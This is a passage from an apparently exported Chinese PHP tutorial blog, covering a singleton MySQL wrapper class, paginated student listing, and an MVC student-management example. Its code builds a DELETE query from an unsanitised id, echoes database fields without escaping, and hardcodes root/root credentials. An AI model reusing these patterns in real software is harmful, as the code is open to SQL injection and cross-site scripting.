class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义最终的单例的数据库工具类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//私有的静态的保存对象的属性</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> $obj = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的数据库配置信息</span></span><br><span class="line"><span class="keyword">private</span> $db_host; <span class="comment">//主机名</span></span><br><span class="line"><span class="keyword">private</span> $db_user; <span class="comment">//用户名</span></span><br><span class="line"><span class="keyword">private</span> $db_pass; <span class="comment">//密码</span></span><br><span class="line"><span class="keyword">private</span> $db_name; <span class="comment">//数据库名</span></span><br><span class="line"><span class="keyword">private</span> $charset; <span class="comment">//字符集</span></span><br><span class="line"><span class="keyword">private</span> $link;   <span class="comment">//连接对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的构造方法：阻止类外new对象</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$config=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_host = $config[<span class="string">&#x27;db_host&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_user = $config[<span class="string">&#x27;db_user&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_pass = $config[<span class="string">&#x27;db_pass&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_name = $config[<span class="string">&#x27;db_name&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;charset = $config[<span class="string">&#x27;charset&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;connectDb(); <span class="comment">//连接MySQL服务器</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;selectDb();  <span class="comment">//选择数据库</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;setCharset();<span class="comment">//设置字符集</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的克隆方法：阻止类外clone对象</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的静态的创建对象的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params">$config=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//判断当前对象是否存在</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">self</span>::$obj <span class="keyword">instanceof</span> <span class="built_in">self</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果对象不存在，创建并保存它</span></span><br><span class="line"><span class="built_in">self</span>::$obj = <span class="keyword">new</span> <span class="built_in">self</span>($config);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回对象</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">self</span>::$obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的连接MySQL服务器方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connectDb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;link = @mysqli_connect(<span class="keyword">$this</span>-&gt;db_host, <span class="keyword">$this</span>-&gt;db_user, <span class="keyword">$this</span>-&gt;db_pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接MySQL服务器失败！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的选择数据库的方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">selectDb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!mysqli_select_db(<span class="keyword">$this</span>-&gt;link, <span class="keyword">$this</span>-&gt;db_name))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;选择数据库<span class="subst">&#123;$this-&gt;db_name&#125;</span>失败！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的设置字符集</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setCharset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mysqli_set_charset(<span class="keyword">$this</span>-&gt;link, <span class="keyword">$this</span>-&gt;charset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的执行SQL语句的方法：insert、update、delete、set、drop等</span></span><br><span class="line"><span class="comment">//执行成功返回true，执行失败返回false</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//例如：update student set salary=salary+500 where id=5</span></span><br><span class="line"><span class="comment">//将SQL语句转成全小写</span></span><br><span class="line">$sql = strtolower($sql);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是不是SELECT语句</span></span><br><span class="line"><span class="keyword">if</span>(substr($sql,<span class="number">0</span>,<span class="number">6</span>)==<span class="string">&#x27;select&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;不能执行SELECT语句！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回执行的结果(布尔值)</span></span><br><span class="line"><span class="keyword">return</span> mysqli_query(<span class="keyword">$this</span>-&gt;link, $sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的执行SQL语句的方法：select</span></span><br><span class="line"><span class="comment">//执行成功返回结果集对象，执行失败返回false</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//例如：SELECT * FROM student</span></span><br><span class="line"><span class="comment">//将SQL语句转成全小写</span></span><br><span class="line">$sql = strtolower($sql);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是不是SELECT语句</span></span><br><span class="line"><span class="keyword">if</span>(substr($sql,<span class="number">0</span>,<span class="number">6</span>)!=<span class="string">&#x27;select&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;不能执行非SELECT语句！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回执行的结果(结果集对象)</span></span><br><span class="line"><span class="keyword">return</span> mysqli_query(<span class="keyword">$this</span>-&gt;link, $sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的获取单行数据的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchOne</span>(<span class="params">$sql,$type=<span class="number">3</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//执行SQL语句，并返回结果集对象</span></span><br><span class="line">$result = <span class="keyword">$this</span>-&gt;query($sql);</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义返回数组类型的常量</span></span><br><span class="line">$types = <span class="keyword">array</span>(</span><br><span class="line"><span class="number">1</span> =&gt; MYSQLI_NUM,</span><br><span class="line"><span class="number">2</span> =&gt; MYSQLI_BOTH,</span><br><span class="line"><span class="number">3</span> =&gt; MYSQLI_ASSOC,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回一维数组</span></span><br><span class="line"><span class="keyword">return</span> mysqli_fetch_array($result, $types[$type]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的获取多行数据的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchAll</span>(<span class="params">$sql, $type=<span class="number">3</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//执行SQL语句，并返回结果集对象</span></span><br><span class="line">$result = <span class="keyword">$this</span>-&gt;query($sql);</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义返回数组类型的常量</span></span><br><span class="line">$types = <span class="keyword">array</span>(</span><br><span class="line"><span class="number">1</span> =&gt; MYSQLI_NUM,</span><br><span class="line"><span class="number">2</span> =&gt; MYSQLI_BOTH,</span><br><span class="line"><span class="number">3</span> =&gt; MYSQLI_ASSOC,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回二维数组</span></span><br><span class="line"><span class="keyword">return</span> mysqli_fetch_all($result, $types[$type]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取记录数</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rowCount</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//执行SQL语句，并返回结果集对象</span></span><br><span class="line">$result = <span class="keyword">$this</span>-&gt;query($sql);</span><br><span class="line"><span class="comment">//返回记录数</span></span><br><span class="line"><span class="keyword">return</span> mysqli_num_rows($result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的析构方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mysqli_close(<span class="keyword">$this</span>-&gt;link); <span class="comment">//断开MySQL连接</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数据库连接文件"><a href="#数据库连接文件" class="headerlink" title="数据库连接文件"></a>数据库连接文件</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//类的自动加载</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params">$className</span>)</span>&#123;</span><br><span class="line"><span class="comment">//构建类文件的路径</span></span><br><span class="line">$filename = <span class="string">&quot;./libs/<span class="subst">$className</span>.class.php&quot;</span>;</span><br><span class="line"><span class="comment">//如果类文件存在，则包含</span></span><br><span class="line"><span class="keyword">if</span>(file_exists($filename))<span class="keyword">require_once</span>($filename);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建数据库类的对象</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;db_host&#x27;</span>=&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_user&#x27;</span>=&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_pass&#x27;</span>=&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_name&#x27;</span>=&gt; <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;charset&#x27;</span>=&gt; <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">);</span><br><span class="line">$db = Db::getInstance($arr);</span><br></pre></td></tr></table></figure><h2 id="显示学生信息文件"><a href="#显示学生信息文件" class="headerlink" title="显示学生信息文件"></a>显示学生信息文件</h2><p>连接数据库，取出数据，通过前端输出数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//包含连接数据库的公共文件</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//每页显示条数</span></span><br><span class="line">$pagesize = <span class="number">10</span>;</span><br><span class="line"><span class="comment">//获取当前页码和计算开始行号</span></span><br><span class="line">$page = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>]) ? $_GET[<span class="string">&#x27;page&#x27;</span>] : <span class="number">1</span>;</span><br><span class="line">$startrow = ($page<span class="number">-1</span>)*$pagesize;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取总记录数和计算总页数</span></span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM student&quot;</span>;</span><br><span class="line">$records = $db-&gt;rowCount($sql);</span><br><span class="line">$pages = ceil($records/$pagesize);</span><br><span class="line"></span><br><span class="line"><span class="comment">//构建分页查询的SQL语句</span></span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM student ORDER BY id DESC LIMIT <span class="subst">&#123;$startrow&#125;</span>,<span class="subst">&#123;$pagesize&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">//获取多行数据</span></span><br><span class="line">$arrs = $db-&gt;fetchAll($sql);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=<span class="string">&quot;text-align: center;padding-bottom:10px;&quot;</span>&gt;</span><br><span class="line">&lt;h2&gt;学生信息管理中心&lt;/h2&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;&quot;</span>&gt;添加学生&lt;/a&gt; </span><br><span class="line">共有&lt;font color=<span class="string">&#x27;red&#x27;</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $records<span class="meta">?&gt;</span>&lt;/font&gt;个学生</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;table width=<span class="string">&#x27;600&#x27;</span> border=<span class="string">&#x27;1&#x27;</span> bordercolor=<span class="string">&#x27;#ccc&#x27;</span> rules=<span class="string">&quot;all&quot;</span> cellpadding=<span class="string">&quot;5&quot;</span> align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;tr bgcolor=<span class="string">&#x27;#f0f0f0&#x27;</span>&gt;</span><br><span class="line">&lt;th&gt;编号&lt;/th&gt;</span><br><span class="line">&lt;th&gt;姓名&lt;/th&gt;</span><br><span class="line">&lt;th&gt;性别&lt;/th&gt;</span><br><span class="line">&lt;th&gt;年龄&lt;/th&gt;</span><br><span class="line">&lt;th&gt;学历&lt;/th&gt;</span><br><span class="line">&lt;th&gt;工资&lt;/th&gt;</span><br><span class="line">&lt;th&gt;奖金&lt;/th&gt;</span><br><span class="line">&lt;th&gt;籍贯&lt;/th&gt;</span><br><span class="line">&lt;th&gt;操作选项&lt;/th&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//循环二维数组</span></span><br><span class="line"><span class="keyword">foreach</span>($arrs <span class="keyword">as</span> $arr)&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;tr align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;id&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;name&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;sex&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;age&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;edu&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;salary&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;bonus&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;city&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;./edit.php&quot;</span>&gt;修改&lt;/a&gt; | </span><br><span class="line">&lt;a href=<span class="string">&quot;javascript:void(0)&quot;</span> onClick=<span class="string">&quot;confirmDel(&lt;?php echo <span class="subst">$arr</span>[&#x27;id&#x27;]?&gt;)&quot;</span>&gt;删除&lt;/a&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP开发学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP开发学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP开发学习--核心编程1</title>
      <link href="2019/12/30/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B--MVC%E6%80%9D%E6%83%B31/"/>
      <url>2019/12/30/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B--MVC%E6%80%9D%E6%83%B31/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP核心编程–MVC思想1"><a href="#PHP核心编程–MVC思想1" class="headerlink" title="PHP核心编程–MVC思想1"></a>PHP核心编程–MVC思想1</h1><h2 id="MVC框架思想原理"><a href="#MVC框架思想原理" class="headerlink" title="MVC框架思想原理"></a>MVC框架思想原理</h2><h3 id="MVC概述"><a href="#MVC概述" class="headerlink" title="MVC概述"></a>MVC概述</h3><p>MVC全名是Model View Controller，是模型(model)－视图(view)－控制器(controller)的缩写；</p><p>MVC是一种软件设计典范，用一种业务逻辑、数据、界面显示分离的方法组织代码；</p><p>MVC中，每个模块只做自己范围内的事情，不是自己的事情千万不做；</p><h3 id="MVC各组件的功能"><a href="#MVC各组件的功能" class="headerlink" title="MVC各组件的功能"></a>MVC各组件的功能</h3><p>Model（数据模型）用于处理应用程序数据逻辑的部分。通常模型对象负责在数据库中存取数据。</p><p>View（视图）是用于处理数据显示的部分。通常视图是依据模型数据创建的。</p><p>Controller（控制器）是应用程序中处理用户交互的部分。通常控制器负责从视图读取数据，控制用户输入，并向模型发送数据。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201118154838078.png" alt="image-20201118154838078"></p><h2 id="MVC实例：学生信息管理"><a href="#MVC实例：学生信息管理" class="headerlink" title="MVC实例：学生信息管理"></a>MVC实例：学生信息管理</h2><h3 id="数据库工厂类三私一公"><a href="#数据库工厂类三私一公" class="headerlink" title="数据库工厂类三私一公"></a>数据库工厂类三私一公</h3><p>主要是创建数据库对象，进行数据库连接。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$config=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_host = $config[<span class="string">&#x27;db_host&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_user = $config[<span class="string">&#x27;db_user&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_pass = $config[<span class="string">&#x27;db_pass&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_name = $config[<span class="string">&#x27;db_name&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;charset = $config[<span class="string">&#x27;charset&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;connectDb(); <span class="comment">//连接MySQL服务器</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;selectDb();  <span class="comment">//选择数据库</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;setCharset();<span class="comment">//设置字符集</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="学生模型类"><a href="#学生模型类" class="headerlink" title="学生模型类"></a>学生模型类</h3><p>主要是连接数据库，对学生数据进行操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//包含数据库工具类</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Db.class.php&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//创建Db类对象</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;db_host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_user&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_pass&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_name&#x27;</span> =&gt; <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">$this</span>-&gt;db = Db::getInstance($arr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在学生模型类中调用数据库对象的某一个方法，其中sql语句自己定义。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取多行数据</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchAll</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//构建查询的SQL语句</span></span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM student ORDER BY id DESC&quot;</span>;</span><br><span class="line"><span class="comment">//执行SQL语句，返回二维数组</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;fetchAll($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除记录</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//构建删除的SQL语句</span></span><br><span class="line">$sql = <span class="string">&quot;DELETE FROM student WHERE id=<span class="subst">&#123;$id&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">//执行SQL语句，并返回布尔值</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;exec($sql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="学生类控制器"><a href="#学生类控制器" class="headerlink" title="学生类控制器"></a>学生类控制器</h3><p>主要是控制用户与数据进行交互，主要是用户交互。比如get、post参数等对应的操作，项目中有删除数据、添加数据等等操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;包含学生模型类</span><br><span class="line">require_once(&quot;.&#x2F;StudentModel.class.php&quot;);</span><br></pre></td></tr></table></figure><p>调用模型类中的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$modelObj &#x3D; new StudentModel();</span><br><span class="line">$arrs &#x3D; $modelObj-&gt;fetchAll();</span><br></pre></td></tr></table></figure><p>最后包含视图模型。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &quot;.&#x2F;StudentIndexView.html&quot;;</span><br></pre></td></tr></table></figure><h3 id="学生视图文件"><a href="#学生视图文件" class="headerlink" 